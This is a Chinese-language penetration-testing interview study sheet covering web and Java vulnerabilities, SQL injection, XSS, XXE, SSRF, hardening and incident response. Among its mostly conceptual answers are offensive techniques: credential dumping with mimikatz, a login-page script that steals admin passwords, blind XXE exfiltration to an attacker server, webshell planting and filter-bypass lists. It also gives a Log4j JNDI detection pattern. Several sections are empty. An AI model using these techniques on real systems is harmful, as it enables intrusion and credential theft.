# 面试总结

<!--last modify: 20230904-->

[toc]

# 0x01 初级

## 如何开展红队/蓝队工作

## 0x01x000 Python 框架

```shell

```

## 0x01x001 常用 WEB 开发 JAVA 框架

```

```

## 0x01x002 Frida 和 Xposed 框架

```shell
# Frida 和 Xposed 框架是两种用于 Android 应用程序动态分析和修改的工具。
1. Frida：Frida是一种功能强大的动态二进制插桩工具，可以在不修改应用程序源代码的情况下，进行运行时的代码注入和修改。它支持多种操作系统，并且可以用于多种应用程序开发平台，包括Android和iOS。通过Frida，安全研究人员和开发人员可以实时监控和修改应用程序的行为，包括调用函数、读取敏感数据、拦截网络通信等。Frida框架提供了易于使用的JavaScript API，使用户能够自定义插件来实现各种分析和修改操作。
2. Xposed框架：Xposed框架是一款基于Android系统的框架，通过修改系统的ClassLoader实现对应用程序的动态加载和修改。使用Xposed框架，用户可以编写模块来劫持应用程序中的方法调用，修改参数和返回值，甚至篡改应用程序的行为。通过Xposed框架，用户可以实现各种功能，包括模块化开发、主题定制、增强功能等。Xposed框架的核心是其自定义的模块化系统，它允许用户编写自己的模块并在框架加载时进行注入，从而实现对应用程序的修改。
# 两者之间的区别在于实现原理和使用方式。Frida是通过动态二进制插桩来实现运行时的代码注入和修改，而Xposed框架则是通过修改系统的ClassLoader实现对应用程序的动态加载和修改。此外，Xposed框架需要在系统中安装Xposed框架应用和相应的模块，而Frida则是通过在目标应用程序进程中注入Frida Agent来实现代码注入和修改。
# 无论是Frida还是Xposed框架，都是用来进行应用程序分析和修改的强大工具，但在使用时需要注意遵守法律和道德规范，确保仅用于合法和授权的目的。
```

## 0x01x003 打点一般用什么漏洞

```shell
1- Java 反序列化：Shiro、Fastjson、Weblogic；
2- CMS/OA：用友
3- Java Web 程序一般高权限有限运行，部分可能降权；
```

## 0x01x004 反序列化

```shell
1- 序列化：将对象转化为字节序列进行存储传输；
2- 反序列化：将字节序列转化为对象便于程序间调用；
```

## 0x01x005 Log4j2 漏洞

```shell
- Apache 远程代码执行漏洞；
- 流量特征：JNDI rule1$(jndi:ldap://) rule2$(jndi:rmi://)；
```

## 0x01x006 Shiro 漏洞类型及发现

```shell
# Shiro 漏洞类型：
	- Shiro 550、Shiro 721
# Shiro 漏洞发现：
	1- 登录失败会返回 rememberMe=deleteMe 字段
		1.1- 未登录：请求包 Cookie 中无 rememberMe 字段，返回包 Set-Cookie 无 deleteMe 字段
		1.2- 登录失败：无论是否勾选 rememberMe 字段，返回包都无 rememberMe=deleteMe 字段
		1.3- 不勾选 rememberMe 字段登录成功：返回包 Set-Cookie 有 rememberMe=deleteMe 字段，之后所有请求 Cookie 都无 rememberMe 字段
		1.4- 勾选 rememberMe 字段登录成功：返回包 Set-Cookie 有 rememberMe=deleteMe 字段，有 rememberMe 字段，之后所有请求中 Cookie 都有rememberMe 字段
	2- 使用 ShiroScan 等工具被动扫描
```

## 0x01x007 Shiro 721 原理与利用

```

```

## 0x01x008 RMI 原理与利用

RMI（Remote Method Invocation）是Java平台提供的一种远程调用机制，它允许在分布式系统中的对象之间进行方法调用。RMI利用了Java的序列化和网络通信机制来实现远程对象之间的通信。

RMI的利用原理如下：

1. 远程接口定义：首先，需要定义一个远程接口，该接口中声明了远程对象可以调用的方法。这个接口必须继承 `java.rmi.Remote`接口，所有的方法也需要抛出 `java.rmi.RemoteException`异常。

```java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface MyRemoteInterface extends Remote {
    public String someMethod() throws RemoteException;
}
```

2. 远程对象实现：在远程对象的类中实现远程接口，并实现其中的方法。这些方法将通过网络在远程机器上执行。

```java
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class MyRemoteObject extends UnicastRemoteObject implements MyRemoteInterface {
   
    protected MyRemoteObject() throws RemoteException {
        super();
    }

    @Override
    public String someMethod() throws RemoteException {
        // 方法实现
    }
}
```

3. 启动RMI注册表：RMI注册表是远程对象的注册和查找中心，客户端需要通过RMI注册表查找远程对象的引用。可以在命令行中使用 `rmiregistry`命令启动RMI注册表。
4. 注册远程对象：在服务器端，需要将远程对象绑定到RMI注册表上，以便客户端可以通过RMI注册表查找到远程对象。

```java
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class Server {
    public static void main(String[] args) {
        try {
            MyRemoteObject remoteObject = new MyRemoteObject();
            LocateRegistry.createRegistry(Registry.REGISTRY_PORT);
            Naming.rebind("rmi://localhost/RemoteObject", remoteObject);
            System.out.println("Remote Object is bound and ready to accept client requests.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

5. 客户端调用：在客户端，需要通过RMI注册表查找到远程对象的引用，然后就可以像调用本地对象一样调用远程对象的方法。

```java
import java.rmi.Naming;

public class Client {
    public static void main(String[] args) {
        try {
            MyRemoteInterface remoteObject = (MyRemoteInterface) Naming.lookup("rmi://localhost/RemoteObject");
            String result = remoteObject.someMethod();
            System.out.println("Result from remote method: " + result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

通过序列化和网络通信，RMI可以在远程机器上调用代码，并将结果返回给客户端，实现了分布式系统中对象的远程调用。

## 0x01x009 Spring 框架漏洞类型

```shell
描述下Spring框架的几个漏洞？
# Spring框架是一个广泛使用的Java开发框架，用于构建企业级应用程序。然而，就像任何软件一样，Spring框架也有可能出现漏洞。以下是一些与Spring框架相关的漏洞和安全问题：
Spring Cloud Connectors：在Spring Cloud Connectors中存在一个漏洞，可能导致远程代码执行。攻击者可以通过提供恶意的Maven仓库URL来利用该漏洞。
Spring Cloud Function：在Spring Cloud Function中存在一个漏洞，可能导致远程代码执行。攻击者可以通过构造恶意的输入来利用该漏洞。
Spring Data JPA：在Spring Data JPA中存在多个漏洞，包括SQL注入、跨站脚本攻击（XSS）等。攻击者可以通过构造恶意的输入来利用这些漏洞。
Spring AMQP：在Spring AMQP中存在一个漏洞，可能导致远程代码执行。攻击者可以通过发送恶意的AMQP消息来利用该漏洞。
Spring Boot：在Spring Boot中存在多个漏洞，包括跨站请求伪造（CSRF）、跨站脚本攻击（XSS）等。攻击者可以通过构造恶意的请求来利用这些漏洞。
# 这些漏洞可能会对应用程序的安全性产生严重影响，因此建议及时更新和修补这些漏洞。此外，还应该采取其他安全措施，如使用强密码、限制用户权限、进行安全审计等，以确保应用程序的安全性。
```

## 0x01x010 [Weblogic 漏洞类型及利用](https://blog.csdn.net/weixin_45728976/article/details/109512848)

```shell
# 漏洞类型：
	1- 基于 T3 协议的反序列化；
	2- 基于 XML 解析时构造的反序列化；
	3- SSRF、权限绕过；
# 漏洞利用：
	1- 权限绕过：使用./ 绕过
	2- (CVE-2020-14882)：未授权，权限绕过
	3- (CVE-2020-14883) 利用方式
		3.1- com.tangosol.coherence.mvel2.sh.ShellSession + 通过URL 访问执行命令；要求版本 12.2.1 +，10.3.6 版本不存在该类
		3.2- com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext + XML 文件(SSRF)
	4- (CVE-2019-2725)
```

## 0x01x011 [Fastjson 漏洞利用原理](https://www.cnblogs.com/hac425/p/9800288.html)

```shell
# 利用原理：
	- 请求包中发送恶意json 格式payload，站点在处理json 对象时未对@type 字段进行过滤，导致攻击者可传入恶意TemplatesImpl 类，部分函数会根据该类中字段_bytecodes 生成Java 实例，即Fastjson 通过字段传入类，由类被生成时执行构造函数
```

## 0x01x012 Fastjson 不出网利用

```shell
BCEL
TemplatesImpl 利用连
```

## 0x01x013 Strust2 漏洞利用原理

```shell
# Struts2是一个基于Java的Web应用开发框架，其目的是为了简化Web应用程序的开发过程。然而，Struts2也存在一些安全问题，其中包括一些漏洞利用。
# Struts2的漏洞利用主要涉及到两个方面：远程代码执行和安全配置问题。
	1- 远程代码执行：
		Struts2中的远程代码执行漏洞主要是由于Struts2在处理用户输入时没有进行充分的验证和过滤。攻击者可以通过构造恶意的输入，让Struts2执行恶意代码。例如，攻击者可以在提交的表单中插入恶意的Action链，让Struts2执行恶意代码。
	2- 安全配置问题：
		Struts2的安全配置问题主要包括权限配置不当、文件上传漏洞、跨站脚本攻击（XSS）等。这些问题主要与Struts2的配置文件、安全过滤器、输入验证等方面有关。攻击者可以通过构造恶意的输入或者利用配置不当的漏洞，绕过安全过滤器或执行恶意代码，进而导致安全问题。
# 为了防止Struts2的漏洞利用，可以采取以下措施：
	1- 及时更新和修补漏洞：及时更新Struts2框架和相关插件，修补已知的漏洞。
	2- 输入验证和过滤：对用户输入进行严格的验证和过滤，防止恶意输入。
	3- 安全配置：正确配置Struts2的安全选项，如权限配置、文件上传设置、跨站脚本攻击（XSS）过滤等。
	4- 备份和恢复：定期备份重要的数据和文件，以便在发生安全问题时能够及时恢复数据。
	5- 安全监控和日志分析：对系统进行安全监控和日志分析，及时发现和处理异常行为和攻击。
```

## 0x01x014 如何抓取密码

```shell
# 抓取方法
	1- procdump + mimikatz 转储，然后mimikatz 离线读取；
	2- SAM 获取，然后离线读取；
  		- Windows Server 2012 版本后抓不到密码；
# 抓不到密码操作：
	1- 翻阅文件查找运维等等是否记录密码；
	2- hash 传递；
	3- 获取浏览器账号密码；
```

## 0x01x015 PHP 反序列化漏洞原理与修复

```shell
# 漏洞原理
	函数传参过程中未采用严格过滤措施，即可能受攻击者构造恶意代码序列化后调用造成反序列化漏洞
	反序列化函数：unserialize()
	构造函数：_construct()
	析构函数：_destruct() / _wakeup() / _toString() / _sleep() 等
# 漏洞修复
```

## Java 附加

### 00x00 IIOP 是什么，和什么类似

```shell
Java 通信，即远程方法调用，默认使用JRMP 协议，亦可选择IIOP；
```

### 00x01 JNI 函数

```shell
# Java 中函数名为 com.didi.security.main
# C 中函数名为
	com_didi_security_mian
	java.com.didi.security.main
```

## 0x01x016 [DCOM 远程命令执行](http://www.taodudu.cc/news/show-3686436.html?action=onClick)

```shell
通过 powershell 执行命令
```

## 0x01x017 不出网除 reg 外如何正向 shell

```shell


```

## 0x01x017 Weblogic 反序列化代码分析



## 0x01x018 PHP EXP 分析

```
对应版本、EXP 各参数作用
```



# 0x00 基础

## 常见漏洞类型

```shell
# OWAP TOP 10
	1- SQL 注入
	2- 失效的身份认证和会话管理
	3- 跨站脚本攻击 XSS
	4- 直接引用不安全的对象
	5- 安全配置错误
	6- 敏感信息泄露
	7- 缺少功能级的访问控制
	8- 跨站请求伪造 CSRF
	9- 使用含有已知漏洞的组件
	10- 未验证的重定向和转发
# XXE、SSRF、反序列化、文件包含、命令注入
```

## 渗透流程

```shell
1- 信息收集
2- 发现漏洞
3- 验证漏洞-利用漏洞
4- 写渗透测试报告
```

## 常见 Web 攻击防御

```shell
1- 对常见漏洞类型针对性防御
	1.1- 如注入类对输入进行过滤、编码、转义、黑白名单
	1.2- 逻辑漏洞类代码修复
2- 漏扫、基线检查，修复存在的问题
3- 尽可能保持升级更新，打补丁等
4- WAF/IDS/IPS 等安全产品防护
5- 网络层面网络策略防护
```

## 常规加固流程

```shell
# 域 Windows 加固流程：
1- 身份鉴别：
	强化密码策略，包括强制复杂密码、定期更换密码等。另外，可以考虑使用多因素身份验证，如指纹、动态令牌等，以提高账户的安全性。
2- 访问控制：
	关闭默认共享，防止潜在攻击。同时，开启防火墙并设置严格的规则，只允许必要的端口和协议通过。还应使用IP安全策略，防止未经授权的访问。
3- 系统资源控制：
	设定屏幕保护程序，并设定在一定时间无操作后自动锁定屏幕。会话超时限制也是一项重要措施，可以防止长时间无操作的用户账户被攻击。
4- 入侵防御：
	开启防火墙并设置规则，限制不必要的网络流量。同时，使用防病毒软件进行全面的系统扫描和监控，确保系统无病毒或恶意软件。
5- 安全配置：
	对系统进行安全配置，包括禁用不必要的服务和应用程序，减少潜在攻击面。定期更新系统和软件补丁，以修复已知漏洞。
6- 数据备份：
	定期备份重要数据，以防数据丢失或损坏。备份数据应存储在安全的地方，如独立的物理设备或云存储。
7- 安全意识和培训：
	对员工进行安全意识和培训，教导他们如何识别并避免网络钓鱼、恶意软件等安全威胁。
8- 安全审计：
	定期进行安全审计，检查系统的日志和事件，识别潜在的安全问题。对于发现的问题，及时进行修复和改进。
```

## 常规应急响应流程

```shell
# 常规应急响应流程通常包括以下步骤：
1. 预防措施：在应急事件发生之前，建立有效的预防措施是至关重要的。这包括进行风险评估、制定和实施安全策略、建立监控系统等。通过这些措施可以尽量减少应急事件的发生概率和影响程度。(准备阶段：预案)
2. 事件检测和评估：及早发现和准确评估应急事件是应急响应的关键。通过实施监控系统、安全检查和日常巡检等手段，快速检测到潜在的安全问题。一旦发现异常情况，应立即进行评估，确定事件的严重程度和影响范围。
3. 通知和警报：一旦确定存在应急事件，通知相关团队和人员进行响应是必要的。这可以通过发送警报通知、电话通知、钉钉、邮件等方式通知适当的人员。确保通知到位，以便有效地组织和协调应急响应工作。
4. 应急响应计划启动：在通知相关人员后，启动应急响应计划。该计划应包括指导在应急事件期间采取的行动，包括任务分配、沟通协调、资源调配等。确保团队成员了解其角色和职责，并立即采取适当的措施应对事件。
5. 事件分析和确认：在应急响应过程中，进行事件分析是至关重要的。了解事件的起因、原因和扩散过程，以及可能的影响和后果。通过分析确定问题的根源，并采取适当的措施进行控制和解决。
6. 应急控制和恢复：针对应急事件，采取控制措施是必要的。这可能包括隔离受影响的系统、关闭漏洞、修复损坏的设备等。同时，紧急恢复计划也应该开展，以便在最短时间内恢复正常运营。
7. 事后总结和改进：应急事件结束后，进行事后总结和评估是为了从中吸取经验教训并改进应急响应能力。通过对应急事件的评估，识别不足之处，提出改进建议，并更新应急计划和预防措施，以加强未来的应急响应能力。
# 请注意，这只是一般应急响应流程的概述，具体的步骤可能因组织和事件类型而有所不同。在实际应急响应中，根据不同的情况和要求，可能需要添补或调整一些步骤。

- 排查思路：产生异常时间、通过现象判断类型；
- 检查账户、网络连接、进程、日志信息、系统启动项等；
1. 查看告警信息，初步判断是否为真实攻击行为，确认同时断网和给研判组研判；
2. 查看日志寻找可疑操作行为和 webshell 文件，使用查杀工具查杀；
3. 恢复资产正常过业务；
4. 总结过程，输出报告；
```

## 0x00x000 SQL 注入原理

```shell
# WEB 应用程序对用户输入的数据
# 没有过滤或者过滤的不严谨
# 并且把用户输入的数据当作SQL 语句
# 带入到数据中去执行
```

## 0x00x001 SQL 注入分类

```shell
# 从反馈结果来分
	1- 回显型
	2- 无回显型/盲注
# 从攻击手法上来分
	1- 联合查询注入 union select
	2- 堆叠注入
	3- 报错注入 updatexml、floor、extravalue、join 其他的用的不多不用说
	4- 盲注
		4.1- 布尔盲注
		4.2- 时间盲注
	5- 二次注入(字符转义)
	6- 宽字节注入
	7- (HTTP Header / XFF / Cookie 注入)

```

## 0x00x002 SQL 注入修复/防御

```shell
# 修复
	- 预编译
# 代码层防御
	1- 对用户输入的内容进行转义 (PHP 中addslashes()、mysql_real_escape() 函数)
	2- 限制关键字的输入 (PHP 中preg_replace() 函数正则替换关键字)，限制输入的长度
	3- 使用 SQL 语句预处理，对 SQL 语句首先进行预编译，然后进行参数绑定，最后传入参数
# 网络层面防御
	- 部署防护墙和软硬 WAF
```

## 0x00x003 SQL 注入疑问

```shell
# 禁用sleep() 函数如何处理
	1- 使用拥有同样功能的函数代替，如 benchmark() 函数

# SQL 注入写文件函数
	1- FILE_GET_contents()
	2- FILE_PUT_contents()

# 延时注入如何判断
	1- 响应时间：对比正常情况下响应时间和注入后响应时间，存在明显延迟则可能存在延时注入
	2- 服务器日志：分析服务器日志，查看是否存在因注入而产生的异常或错误日志，可能提供有关延时注入的线索
	3- 响应内容：对比正常情况和注入后的响应内容，看是否存在返回结果的差异。如正常情况返回结果是数字，在注入后返回结果是字符串或其他不符合常规返回结果的类型，这可能表示存在延时注入
```

## 0x00x004 SQL 注入过 bypass

```shell
1- 大小写、内联注释、关键字替换等
2- 等量替换
3- 参数污染 HPP
4- 编码绕过
5- SQL 特性
```

## SQL 注入 附加

[SQL注入常见函数](https://blog.csdn.net/qq_44204058/article/details/113706867)

### 00x00 如何突破注入时字符被转义

```shell
# 单引号被过滤怎么办 单改双或加反斜杠
1- 逆向思维：尝试使用相反的转义操作，如将单引号改双引号，双引号改单引号
2- 插入特殊字符：尝试插入特殊字符（如反斜杠）绕过转义操作
3- 使用其他字符集：尝试使用不同字符集或编码方式进行注入，如 UTF-8、ISO-8859-1 等
4- 使用其他注入技术：尝试使用其他类型的注入技术，如布尔盲注或时间注入
5- 暴力破解：尝试使用不同的输入组合绕过转义操作
```

### 00x01 宽字节注入产生原理、原因、防御

```shell
# 原理：
	- 利用数据库编码与操作系统的宽字节字符集（如 GBK）间的差异。在 GBK 编码中某些字符的宽字节表示形式与单字节字符不同。攻击者通过在输入中插入特殊字符，使数据库解析时出现错误，导致 SQL 注入或数据泄露等安全问题
# 原因：
	- 数据库未对用户输入进行正确编码转义，导致输入特殊字符在解析时产生错误。如当数据库使用 GBK 编码时，若用户输入数据中包含 GBK 编码中的宽字节字符，而数据库未正确转义处理，解析时就会产生错误。攻击者可利用错误构造特定输入执行未授权的 SQL 语句或获取数据库中的敏感数据
# 防御：
	1- 对用户输入进行严格验证和过滤，确保输入符合预期格式和编码要求
	2- 对数据库查询语句进行参数化处理，避免直接拼接用户输入
	3- 使用适当转义函数对用户输入转义处理，确保输入特殊字符正确被解析和转义
	4- 及时更新数据库和操作系统的安全补丁，修复可能存在的漏洞
	5- 配置安全的数据库权限和访问控制策略，限制对敏感数据的访问和操作
```

### 00x02 SQL 注入是否可直接 order by

```shell
# 注入时不用and/or/xor，直接 order by 是否可以
	1- and/or/xor，1=1/1=2 为判断是否存在注入点，若已确定注入点可省略
```

### 00x03 如何加快盲注速度

```shell
1- dnslog
2- sqli-less9
3- 二分法
4- 二进制延时注入
```

### 00x04 对某防注入系统注入时会提示

```shell
系统检测到你有非法注入的行为。
    已记录您的ip xx.xx.xx.xx
    时间:2016:01-23
    提交页面:test.asp?id=15
    提交内容:and 1=1
# 如何利用这个防注入系统拿 shell
	1- URL 里直接提交一句话，网站会将一句话记录进数据库文件
	2- 可尝试寻找网站配置文件，上菜刀连接
```

### 00x05 对 indext.php?id=AjAxNg== 变形注入

```shell
1- DATA 可能经过 base64 编码再传入服务器，要对参数进行 base64 编码才能正确完成测试
```

### 00x06 CRLF 注入原理

```shell
# CRLF（Carriage Return Line Feed） 攻击者通过在输入中注入特殊 CRLF 字符序列，可绕过应用程序输入验证和过滤机制进而执行恶意操作
# CRLF 注入漏洞又称 HTTP 响应拆分漏洞（HTTP Response Splitting），攻击方式是将回车符、换行符注入到 HTTP 响应包中
HTTP 响应包通常以两个换行符，去划分响应头与响应正文两部分。当用户的操作足以控制响应头内容时，将会出现 CRLF 漏洞

回车符(CR，ASCII 13，\r，%0d)
换行符(LF，ASCII 10，\n，%0a)

换行符的作用：在 HTTP 协议中，换行符（CRLF）用于分隔请求和响应中的头部和正文
攻击的影响：由于换行符的存在，攻击者可利用 CRLF 注入进行各种攻击，包括但不限于以下几种：
	HTTP 响应拆分：可通过注入 CRLF 拆分 HTTP 响应，插入额外恶意响应内容，如恶意脚本、重定向或欺骗性链接。可能导致钓鱼攻击、会话劫持等安全问题
	HTTP 头注入：可通过注入 CRLF 修改 HTTP 响应头，包括设置 Cookie、重定向地址等，从而劫持用户会话或执行其他恶意操作
	HTTP 响应截断：可利用 CRLF 注入终止 HTTP 响应头处理，导致应用程序后续代码被忽略或误解析，从而执行未经授权的操作
```

## 0x00x005 XSS 原理

```shell
# 攻击者通过向站点网页插入恶意 JS 代码，引导用户访问页面时，恶意脚本会被执行；
1- XSS 漏洞是跨站脚本攻击
2- HTML代码的注入
3- 通过对网页，注入浏览器可执行的代码，从而实现的攻击手段。
```

## 0x00x006 XSS 分类、区别

```shell
# 反射型：
	攻击者将恶意脚本注入到 URL 参数中，当用户点击该 URL 时，恶意脚本会被执行；
# 存储型：
	攻击者将恶意脚本注入到 Web 应用程序的数据库中，当用户访问包含该恶意脚本页面时，恶意脚本会被执行；
# DOM 型：
	攻击者将恶意脚本注入到 Web 页面的 DOM 中，当用户访问包含该恶意脚本页面时，恶意脚本会被执行；

# 反射型 和 存储型
	都需需要经过服务器解析，并与数据库产生交互
# DOM 型
	只需要经过前端解析，不与数据库产生交互
# 存储型 和 DOM 型
	都会将攻击代码长期存在受害者服务器
#  反射型
	而反射型，只会反弹一次攻击代码
```

## 0x00x007 XSS 防御

```shell
1- 禁用浏览器 JavaScript 访问带有 HttpOnly 属性的 Cookie
2- 输入检查
	-2.1 对输入进行过滤、转义、编码，包括特殊字符(如<、>、'、"等)
3- 输出检查
	-3.1 安全编码函数
4- 使用 Web 应用程序防火墙（WAF）识别和阻止 XSS 攻击
5- 软件和 Web 应用程序保持最新版本，许多 XSS 漏洞可通过最新安全补丁解决
```

## XSS 附加

### 00x00 如何使用 XSS 长久控制目标站点

```shell
# 在有shell的情况下，如何使用 XSS 实现对目标站长久控制
	1- 后台登录处加一段记录登录账号密码的 JS，且判断是否登录成功
	2- 登录成功，将账号密码记录到生僻路径的文件中，或发送到自己网站文件中
# (此方法适合有价值且需深入控制权限的网络)
# 在登录后才可访问的文件中插入XSS脚本
```

### 00x01 XSS 蠕虫产生条件

```shell
# XSS（跨站脚本）蠕虫是一种利用网页上存在的安全漏洞，在用户访问包含恶意脚本的页面时自动传播恶意代码。产生 XSS 蠕虫条件如下：
	1- 存在跨站脚本漏洞：网站或应用程序中存在未充分过滤或验证用户输入的地方，使得攻击者可在页面中插入恶意脚本
	2. 可执行的恶意代码：攻击者必须能够在受攻击网站上执行恶意代码，可通过利用网站漏洞或操纵用户行为实现，如在评论框、搜索框或用户提交表单中注入恶意代码
	3. 自动传播机制：XSS 蠕虫需能自动传播，使得恶意代码在用户间进行传递。可通过操纵网页中的链接、重定向或其他交互元素来实现
	4. 用户访问：XSS 蠕虫是以用户为中心的，用户必须访问包含恶意代码的网页。攻击者可通过欺骗用户点击恶意链接、发送恶意电子邮件、利用社交工程等方式引导用户访问受感染的页面
```

## 0x00x008 XXE 原理

```shell
# XXE 漏洞就是 XML 外部实体注入漏洞
通常和危害一起回答出来会感觉更加流畅和自然
# 通常发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，
	导致可加载恶意外部文件，
	造成文件读取、
	命令执行、
	内网端口扫描、
	攻击内网网站、
	发起 DOS 攻击等危害。
```

## 0x00x009 XXE 分类

```shell
1- 有回显型 XXE
2- 无回显型 XXE
```

## 0x00x010 XXE 引入方式

```shell
1- 本地映入
2- 外部引入
3- 外部参数实体引入
```

## 0x00x011 XXE 盲注处理

```shell
# XXE 无回显注入，可选择使用 DNS 外带和 外部参数实体注入
1- 在攻击者自己的公网服务器，准备一个test.dtd 通过 base64 为将读取的内容加密得到的值当作传参值，发送给攻击者的公网服务器
2- 受害者那边，通过外部参数实体注入 访问攻击者公网服务器下的 test.dtd 文件
3- 最后看，攻击者公网服务器的日志，转码得到受害者服务器的内容
```

## 0x00x012 CSRF 利用条件

```shell
1- 用户在统一浏览器下
2- 未关闭浏览器情况下
3- 访问攻击者精心伪装好的网页或恶意链接
```

## 0x00x013 CSRF 防御

```shell
# 作验证
	1- 验证 Referer
	2- 添加 Token
	3- 关键地方验证码验证
	4- 尤其是修改密码，要验证旧密码
```

## 0x00x014 SSRF 原理

```shell
1- 服务器允许向其他服务器获取资源
2- 但未对该地址做严格过滤和限制
3- 导致攻击者可向受害者服务器传入任意 URL 地址，并将数据返回
```

## 0x00x015 SSRF 利用方式及危害

```shell
# 攻击者利用该漏洞可让服务器发起未经授权的请求，可能导致敏感信息泄露、内网访问、服务拒绝等问题。下面是常见的 SSRF 利用方式：
内网、本地端口扫描，获取开放端口信息
主机信息收集，Web 应用指纹识别，获取服务 Banner 信息
根据识别出的应用针对性的发送 payload 攻击，如 Struts2
攻击内网和本地的应用程序及服务
穿越防火墙
利用 file 协议读取本地文件，比如 file:///etc/passwd

1. 通过指定 URL：攻击者在目标应用程序的输入参数中，指定一个带有服务器端需要请求的URL的参数值。服务器会读取该参数并发送请求。攻击者可以将目标定为内部网络的非公开地址或其他敏感服务。
2. 通过 IP 地址：攻击者可以直接在输入参数中指定IP地址，绕过DNS解析，让服务器直接请求指定的IP。
3. 绕过防火墙和安全限制：攻击者可以使用SSRF来绕过防火墙或安全限制，让服务器访问被安全限制的资源。例如，绕过防火墙访问内部管理接口、配置文件或敏感信息等。
4. 利用协议：攻击者可以通过指定特定的协议（如file://、dict://、gopher://等），使服务器发起非标准的请求，访问文件系统、访问内部协议、读取敏感数据等。
5. SSRF与其他漏洞组合利用：攻击者可以将SSRF与其他漏洞结合，例如本地文件包含（LFI）、远程代码执行（RCE）等，以进一步获取敏感信息或进行攻击。
# 为防止 SSRF 攻击，应谨慎处理用户输入，并采取以下措施：限制用户输入的URL和IP范围、过滤不信任的协议和URL，设置白名单，使用安全沙盒机制等。同时，合理配置服务器的权限和访问控制，限制服务对内部网络的访问，并使用Web应用防火墙来检测和阻止SSRF攻击。

# 危害
1- SQL 注入
2- Sturts2
3- 端口探测
4- 敏感信息泄露
# 最为主要的是能够访问到外网无法访问的系统和服务器，漫游内网
```

## 0x00x016 SSRF 防御

```shell
1- 地址做白名单处理
2- 域名识别 ip，过滤内部 ip
3- 并校验返回内容对比是否与假定的一致
4- 禁用不必要协议
5- 统一页面错误信息，避免攻击者利用
6- 过滤函数 file_get_contents / fsockopen / curl_exec
```

## 0x00x017  CSRF 和 XSS 和 XXE 区别与修复

```shell
# XSS
	1- 跨站脚本攻击，用户提交的数据中可构造代码执行，实现窃取用户信息等攻击
	2- 修复方式：对字符实体转义、HTTP Only 禁止 JavaScript 读取 Cookie 值、输入校验、浏览器与 Web 应用端采用相同字符编码
# CSRF
	1- 跨站请求伪造攻击，XSS 是实现 CSRF 诸多手段中的一种，由未在关键操作执行时进行是否由用户自愿发起的确认
	2- 修复方式：筛选需防范 CSRF 的页面然后嵌入 Token、再次输入密码、检验 Referer
# XXE
	1- XML 外部实体注入攻击，XML 中可通过调用实体来请求本地或远程内容，和远程文件保护类似，会引发相关安全问题，如敏感文件读取
	2- 修复方式：XML 解析库在调用时严格禁止对外部实体的解析
```

## 0x00x018 CSRF、SSRF 和重放攻击区别

```shell
# CSRF 是跨站请求伪造攻击，由客户端发起
# SSRF 是服务器端请求伪造，由服务器发起
# 重放攻击 是将截获的数据包进行重放，达到身份认证等目的
```

## XML 附加

### 00x00 img 标签获取管理员路径方法

```shell
# img 标签除 onerror 属性外获取管理员路径方法
	1- onerror 属性
	2- src 指定远程脚本文件，获取 Referer
```

### 00x01 Cookie 相关

```shell
# Cookie 存储位置，浏览器客户端上
	1- 可保存在运行内存中（浏览器关闭 Cookie 即小时）
	2- 保存在硬盘文件中（设置有保存机制，如n day 免登录机制）
# XSS 如何盗取 Cookie
	1- 攻击者在网页中插入恶意脚本
	2- 引诱用户访问包含恶意脚本的网页
	3- 恶意脚本自动将用户 Cookie 信息发送到攻击者服务器
# XSS 有 Cookie 就能无用户名、密码登录吗
	1- 不一定，Cookie 只是一种存储在客户端关于用户身份和会话状态信息的数据
	2- 服务器仍需通过其他方式需验证身份
```

### 00x02 Session 工作原理

```shell
1- 用户首次访问 Web 应用时，自动生成一个唯一 Session ID，将此 Session ID 以 Cookie 形式返给浏览器
2- 在用户浏览器中生成一个名为 sessionid 的 Cookie（名字可配置），包含 Session ID
3- 当用户访问 Web 应用其他页面时，浏览器自动将 Cookie 中 Session ID 发送给服务器端
4- 服务器端收到请求，反序列化 Session ID 查找对应 Session 对象
5- 若找到对应 Session，服务器端即根据 Session 中保存的数据处理请求，若未找到对应 Session，服务器端可能会创建新的 Session
6- 当 Session 中数据发生变化时，服务器端会持久化数据，确保用户刷新页面或打开新窗口时数据不会丢失
7- 当用户关闭浏览器，Session 或者 Session ID 即被销毁，表示用户本次会话结束

# 注意
	1- Session 过期时间一般会设置，过期 Session 在服务器端即被销毁
	2- Web 应用也可手动创建和销毁 Session，使开发人员更加灵活地管理和使用 Session
```

### 00x03 Cookies 和 Session 区别

```shell
1- 数据存储位置：Cookie 数据存客户端浏览器上，Session 数据存服务器上
2- 安全性：Cookie 不是很安全，攻击者可分析 Cookie 进行 Cookie 欺骗，考虑安全应使用 Session
3- 存储容量：单个 Cookie 保存数据 ≤ 4KB，单站点最多保存 20 个；Session 无上限，对服务器端性能考虑 Session 不要存过多，并设置 Session 删除机制
4- 存取方式：Cookie 中只保管 ASCll 字符串，需通过编码方式存取 Unicode 字符或二进制数据；Cookie 难以实现存储略微复杂信息
5- 隐私策略：Cookie 对客户端可见，攻击者可分析 Cookie 进行 Cookie 欺骗
6- 有效期：
	6.1- 开发可通过设置 Cookie 属性，达到 Cookie 长期有效
	6.2- Session 依赖 JSESSIONID 的 Cookie，而 Cookie JSESSIONID 过期时间默认为 -1，关闭窗口 Session 就失效，即 Session 不能达到长期有效效果
7- 服务器压力：
	7.1- Session 是保管在服务端的，每个用户都会产生一个 Session，如并发访问用户十分多，会产生十分多的 Session，耗费大量的内存
	7.2- Cookie 是保管在客户端，不占用服务器资源，对于并发用户十分多的网站，cookie 是很好的选择
8- 跨域支持：
	8.1- Cookie 支持跨域名访问；
	8.2- Session 则不支持跨域名访问
```

## 0x00x019 文件上传分类

```shell
1- 白名单
2- 黑名单
```

## 0x00x020 文件上传 bypass

```shell
# 前端 JS 突破：
	1- 前端 JS 绕过，文件名大小写绕过，抓包修改文件后缀名，双重后缀名突破 或 禁用当前浏览器 JS 脚本
	2- 中间件解析漏洞绕过
# 后端突破：
	1- 黑名单：点、空格点、换行符、php 1234567、phphtml、分布式文件上传、文件流绕过 ....
	2- 白名单：00 截断、路径截断、时间竞争、双文件上传、双文件名 ...
```

## 文件上传 附加

### 00x00 审查上传点的元素有何意义

```shell
1- 防止恶意行为：
